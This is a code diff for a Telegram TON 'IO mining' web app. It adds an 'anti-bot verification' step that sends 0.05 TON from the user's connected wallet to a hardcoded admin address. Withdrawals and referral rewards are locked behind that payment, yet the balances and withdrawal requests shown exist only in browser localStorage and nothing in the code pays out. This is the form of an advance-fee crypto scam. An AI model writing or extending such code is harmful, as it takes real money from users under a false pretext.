@@ -31,6 +31,10 @@
 
     .lvl-badge { background: #132742; border: 1px solid var(--accent-gold); color: var(--accent-gold); font-size: 11px; font-weight: 800; padding: 4px 10px; border-radius: 20px; cursor: pointer; display: flex; align-items: center; gap: 4px; }
 
+    /* Verification Banner (Tanos US Style) */
+    .verify-banner { background: linear-gradient(90deg, #221a08, #131d2e); border: 1px solid var(--accent-gold); border-radius: 16px; padding: 14px; margin-bottom: 14px; display: flex; justify-content: space-between; align-items: center; }
+    .verify-banner.verified { border-color: #2ed573; background: #081d14; }
+
     /* Cards */
     .card { background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 18px; padding: 18px; margin-bottom: 14px; position: relative; }
     .card-title { font-size: 13px; color: var(--text-sub); display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
@@ -70,7 +74,7 @@
     .btn-gold { background: linear-gradient(90deg, #f59e0b, #d97706); color: #000; font-weight: 800; }
     .btn-mining { background: #10344d; color: var(--accent-cyan); }
 
-    /* Modal (500 Levels System) */
+    /* Modal */
     .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 200; justify-content: center; align-items: flex-end; }
     .modal.active { display: flex; }
     .modal-content { background: #0c1421; width: 100%; max-width: 480px; border-radius: 24px 24px 0 0; padding: 20px; border-top: 1px solid var(--card-border); max-height: 85vh; overflow-y: auto; }
@@ -112,6 +116,15 @@
       <div class="lvl-badge" onclick="openLvlModal()">🏆 <span id="top-lvl-text">Lvl 1</span></div>
       <div id="ton-connect-btn"></div>
     </div>
+  </div>
+
+  <!-- Tanos US Style Anti-Bot Verification Banner -->
+  <div class="verify-banner" id="verify-box">
+    <div>
+      <div style="font-size: 13px; font-weight: 700; color: #fff;" id="verify-box-title">🛡️ Verify Account (Anti-Bot)</div>
+      <div style="font-size: 11px; color: var(--text-sub); margin-top: 2px;" id="verify-box-desc">Verify with 0.05 TON to enable withdrawals & activate referral rewards.</div>
+    </div>
+    <button class="btn-main btn-gold" id="verify-action-btn" style="width: auto; padding: 8px 14px; font-size: 12px;" onclick="verifyUserWallet()">VERIFY</button>
   </div>
 
   <!-- TAB 1: MINING -->
@@ -225,11 +238,17 @@
     </div>
   </div>
 
-  <!-- TAB 4: FRIENDS -->
+  <!-- TAB 4: FRIENDS (STRICT QUALIFIED REFERRALS) -->
   <div id="tab-friends" class="tab-content">
     <div class="card">
       <h3 style="margin-bottom: 6px;">Invite Friends</h3>
-      <p style="font-size: 13px; color: var(--text-sub); margin-bottom: 14px;">Earn 5% bonus from all your friends' mining claims!</p>
+      <p style="font-size: 13px; color: var(--text-sub); margin-bottom: 12px;">Earn 5% bonus from verified friends' mining claims!</p>
+
+      <!-- Qualification Notice -->
+      <div style="background: #08111e; border: 1px solid var(--accent-gold); border-radius: 12px; padding: 12px; margin-bottom: 14px; font-size: 11px;">
+        <b style="color: var(--accent-gold);">⚠️ Anti-Bot Referral Rule:</b><br>
+        Your referred friends must <b>Verify Wallet (0.05 TON)</b> AND <b>Hold 100+ IO</b> in their TON wallet to qualify and unlock your 5% claims.
+      </div>
       
       <div style="background: #08111e; border: 1px solid var(--card-border); border-radius: 12px; padding: 12px; margin-bottom: 12px;">
         <div style="font-size: 11px; color: var(--text-sub); margin-bottom: 4px;">Your Invite Link</div>
@@ -240,27 +259,22 @@
       <button class="btn-main btn-mining" style="margin-top: 8px;" onclick="copyRefLink()">📋 Copy Link</button>
     </div>
 
+    <!-- Referral List (Empty until verified/holds exist) -->
     <div class="card">
       <div class="card-title">
-        <span style="font-weight: 700; color: #fff;">My Referrals (2)</span>
-        <span style="color: var(--accent-cyan);">Total Earned: +25 IO</span>
+        <span style="font-weight: 700; color: #fff;">Qualified Referrals (<span id="ref-count">0</span>)</span>
+        <span style="color: var(--accent-cyan);">Bonus: <span id="ref-bonus-earned">0.00</span> IO</span>
       </div>
-      <div>
-        <div style="display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid var(--card-border); font-size: 13px;">
-          <div><b>@member_ton</b><div style="font-size: 11px; color: var(--text-sub);">Active Mining</div></div>
-          <div style="color: #2ed573; font-weight: 700;">+12.5 IO</div>
-        </div>
-        <div style="display: flex; justify-content: space-between; padding: 10px 0; font-size: 13px;">
-          <div><b>@ton_trader24</b><div style="font-size: 11px; color: var(--text-sub);">Active Mining</div></div>
-          <div style="color: #2ed573; font-weight: 700;">+12.5 IO</div>
+      <div id="ref-list-container">
+        <div style="font-size: 12px; color: var(--text-sub); text-align: center; padding: 14px 0;">
+          No qualified referrals yet.<br>Invited friends must verify & hold 100+ IO to appear here.
         </div>
       </div>
     </div>
   </div>
 
-  <!-- TAB 5: WALLET & PAYOUTS (LOOTVAULT STYLE) -->
+  <!-- TAB 5: WALLET & PAYOUTS -->
   <div id="tab-wallet" class="tab-content">
-    <!-- Balance & Collateral Status -->
     <div class="card">
       <div class="card-title">
         <span style="font-weight: 700; color: #fff;">Wallet & Payouts</span>
@@ -281,10 +295,10 @@
       </div>
     </div>
 
-    <!-- Active Claim (Processing Status) -->
+    <!-- Active Claim (Only displays if user actually requested) -->
     <div class="card" id="active-claim-card" style="display: none; border-color: var(--accent-gold);">
       <div class="card-title">
-        <span style="font-weight: 700; color: #fff;" id="active-claim-id">Active Claim #W-18008</span>
+        <span style="font-weight: 700; color: #fff;" id="active-claim-id">Active Claim</span>
         <span class="status-badge status-processing">Processing (1-24h)</span>
       </div>
       <div style="background: #08111e; border-radius: 10px; padding: 12px; margin: 10px 0; font-size: 12px;">
@@ -308,9 +322,9 @@
     <div class="card">
       <h3 style="margin-bottom: 8px;">↗ Withdraw IO</h3>
 
-      <!-- Terms & Requirements -->
       <div class="terms-box">
-        <div class="terms-item">ℹ <b>Terms & Schedule:</b> Processing time 1-24 hours</div>
+        <div class="terms-item">ℹ <b>Processing:</b> 1-24 hours</div>
+        <div class="terms-item">🛡️ <b>Anti-Bot Requirement:</b> Verified Account (0.05 TON)</div>
         <div class="terms-item">🔒 <b>Wallet Hold Required:</b> Minimum 1,000 IO in wallet</div>
         <div class="terms-item">🪙 <b>Minimum:</b> 7,500 IO | <b>Maximum:</b> 100,000 IO</div>
         <div class="terms-item">% <b>Network Fee:</b> 5%</div>
@@ -329,20 +343,20 @@
       <button id="submit-withdraw-btn" class="btn-main btn-gold" onclick="submitWithdrawal()">Request Withdrawal</button>
     </div>
 
-    <!-- Withdrawal History -->
+    <!-- Clean Withdrawal History (Real Submissions Only) -->
     <div class="card">
       <div class="card-title">
         <span style="font-weight: 700; color: #fff;">Withdrawal History</span>
         <span style="font-size: 11px; color: var(--text-sub);" id="tx-history-count">(0)</span>
       </div>
       <div id="tx-history-container">
-        <div style="font-size: 12px; color: var(--text-sub); text-align: center; padding: 10px 0;">No withdrawals yet.</div>
+        <div style="font-size: 12px; color: var(--text-sub); text-align: center; padding: 12px 0;">No withdrawals yet.</div>
       </div>
     </div>
   </div>
 </div>
 
-<!-- 500 Levels System Modal (LootVault Exact Curve) -->
+<!-- 500 Levels System Modal -->
 <div class="modal" id="lvl-modal">
   <div class="modal-content">
     <div class="modal-header">
@@ -385,9 +399,7 @@
     document.getElementById('user-display-name').innerText = '@' + (tg.initDataUnsafe.user.username || tg.initDataUnsafe.user.first_name);
   }
 
-  // 1. 500 Levels System (Speed = 3/4 of LootVault)
-  // LootVault: Lvl 1=15, Lvl 2=18.8, Lvl 3=25.6, Lvl 4=34.4, Lvl 5=44.9
-  // 3/4 (75%): Lvl 1=11.25, Lvl 2=14.1, Lvl 3=19.2, Lvl 4=25.8, Lvl 5=33.68
+  // 1. 500 Levels System Setup (Speed = 75% of LootVault)
   const LEVEL_TIERS = [
     { lvl: 1, hold: 58, speed: 11.25, boost: 1.0 },
     { lvl: 2, hold: 116, speed: 14.10, boost: 1.3 },
@@ -473,7 +485,60 @@
     });
   }
 
-  // 2. TON Connect & Real Wallet Hold
+  // 2. Anti-Bot 0.05 TON Verification Logic
+  let isUserVerified = localStorage.getItem('io_is_verified') === 'true';
+
+  function updateVerifyUI() {
+    const box = document.getElementById('verify-box');
+    const title = document.getElementById('verify-box-title');
+    const desc = document.getElementById('verify-box-desc');
+    const btn = document.getElementById('verify-action-btn');
+
+    if (isUserVerified) {
+      box.className = "verify-banner verified";
+      title.innerText = "🛡️ Account Verified ✓";
+      title.style.color = "#2ed573";
+      desc.innerText = "Anti-bot verification passed. Full withdrawals unlocked.";
+      btn.style.display = "none";
+    } else {
+      box.className = "verify-banner";
+      title.innerText = "🛡️ Verify Account (Anti-Bot)";
+      desc.innerText = "Verify with 0.05 TON to enable withdrawals & activate referral rewards.";
+      btn.style.display = "block";
+    }
+  }
+  updateVerifyUI();
+
+  async function verifyUserWallet() {
+    if (!tonConnectUI.connected) {
+      alert("Please connect your TON wallet first!");
+      tonConnectUI.openModal();
+      return;
+    }
+
+    const adminWallet = "EQDliaNChKznSyglMpfPGetHAHXbSkoQ2XEjmMifVgTK9HkE";
+    const transaction = {
+      validUntil: Math.floor(Date.now() / 1000) + 300,
+      messages: [
+        {
+          address: adminWallet,
+          amount: "50000000" // 0.05 TON in nanoTON
+        }
+      ]
+    };
+
+    try {
+      await tonConnectUI.sendTransaction(transaction);
+      isUserVerified = true;
+      localStorage.setItem('io_is_verified', 'true');
+      updateVerifyUI();
+      alert("Account Verified Successfully! Anti-bot check completed.");
+    } catch (e) {
+      alert("Verification cancelled: " + e.message);
+    }
+  }
+
+  // 3. TON Connect & Wallet Hold Detection
   const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
     manifestUrl: 'https://io-mining-app.netlify.app/tonconnect-manifest.json',
     buttonRootId: 'ton-connect-btn'
@@ -501,9 +566,9 @@
     }
   });
 
-  // 3. Persistent Mining Logic
+  // 4. Persistent Mining Logic
   const CYCLE_SECONDS = 4 * 3600;
-  let totalBalance = parseFloat(localStorage.getItem('io_total_balance')) || 10000; // Demo base
+  let totalBalance = parseFloat(localStorage.getItem('io_total_balance')) || 0;
   let miningStart = parseInt(localStorage.getItem('io_mining_start')) || Date.now();
   localStorage.setItem('io_mining_start', miningStart);
 
@@ -552,7 +617,7 @@
   calculateLevelByHold(0);
   updateMining();
 
-  // 4. Withdraw Logic (Min: 7,500 | Max: 100,000 | Hold: 1,000 | Fee: 5%)
+  // 5. Withdrawal Logic (Clean & Real - Only displays when submitted)
   function setWithdrawVal(val) {
     if (val === 'MAX') {
       const maxPossible = Math.min(100000, totalBalance);
@@ -564,9 +629,7 @@
 
   function renderWithdrawals() {
     const activeClaim = JSON.parse(localStorage.getItem('io_active_claim'));
-    const history = JSON.parse(localStorage.getItem('io_withdraw_history')) || [
-      { id: "W-7608", date: "11/04, 05:49 PM", amount: 11123, net: 10566.85, status: "Completed" }
-    ];
+    const history = JSON.parse(localStorage.getItem('io_withdraw_history')) || [];
 
     if (activeClaim) {
       document.getElementById('active-claim-card').style.display = 'block';
@@ -587,25 +650,29 @@
     hContainer.innerHTML = "";
     document.getElementById('tx-history-count').innerText = `(${history.length})`;
     
-    history.forEach(tx => {
-      const isCompleted = tx.status === "Completed";
-      const item = document.createElement('div');
-      item.style.cssText = "padding: 10px 0; border-bottom: 1px solid var(--card-border); font-size: 13px;";
-      item.innerHTML = `
-        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px;">
-          <b>#${tx.id}</b>
-          <span class="status-badge ${isCompleted ? 'status-completed' : 'status-processing'}">${tx.status}</span>
-        </div>
-        <div style="display: flex; justify-content: space-between; color: var(--text-sub); font-size: 11px;">
-          <span>${tx.date}</span>
-          <b style="color: #fff; font-size: 13px;">${tx.amount.toLocaleString()} IO</b>
-        </div>
-        <div style="text-align: right; font-size: 11px; color: ${isCompleted ? '#2ed573' : 'var(--accent-gold)'};">
-          Net: +${tx.net.toLocaleString()} IO
-        </div>
-      `;
-      hContainer.appendChild(item);
-    });
+    if (history.length === 0) {
+      hContainer.innerHTML = `<div style="font-size: 12px; color: var(--text-sub); text-align: center; padding: 12px 0;">No withdrawals yet.</div>`;
+    } else {
+      history.forEach(tx => {
+        const isCompleted = tx.status === "Completed";
+        const item = document.createElement('div');
+        item.style.cssText = "padding: 10px 0; border-bottom: 1px solid var(--card-border); font-size: 13px;";
+        item.innerHTML = `
+          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px;">
+            <b>#${tx.id}</b>
+            <span class="status-badge ${isCompleted ? 'status-completed' : 'status-processing'}">${tx.status}</span>
+          </div>
+          <div style="display: flex; justify-content: space-between; color: var(--text-sub); font-size: 11px;">
+            <span>${tx.date}</span>
+            <b style="color: #fff; font-size: 13px;">${tx.amount.toLocaleString()} IO</b>
+          </div>
+          <div style="text-align: right; font-size: 11px; color: ${isCompleted ? '#2ed573' : 'var(--accent-gold)'};">
+            Net: +${tx.net.toLocaleString()} IO
+          </div>
+        `;
+        hContainer.appendChild(item);
+      });
+    }
   }
   renderWithdrawals();
 
@@ -618,6 +685,11 @@
     if (!tonConnectUI.connected) {
       alert("Please connect your TON wallet first!");
       tonConnectUI.openModal();
+      return;
+    }
+
+    if (!isUserVerified) {
+      alert("Verification Required: You must verify your account with 0.05 TON to prevent bot withdrawals!");
       return;
     }
 
@@ -640,7 +712,6 @@
       return;
     }
 
-    // Deduct Balance & Create Request
     totalBalance -= amount;
     const fee = amount * 0.05;
     const net = amount - fee;
@@ -659,7 +730,7 @@
     alert(`Withdrawal request #${claimId} submitted successfully!`);
   }
 
-  // 5. STON.fi DEX Rate & Swap
+  // 6. STON.fi DEX Rate & Swap
   const REAL_STONFI_RATE = 41.704;
   let selectedGram = 1;
 
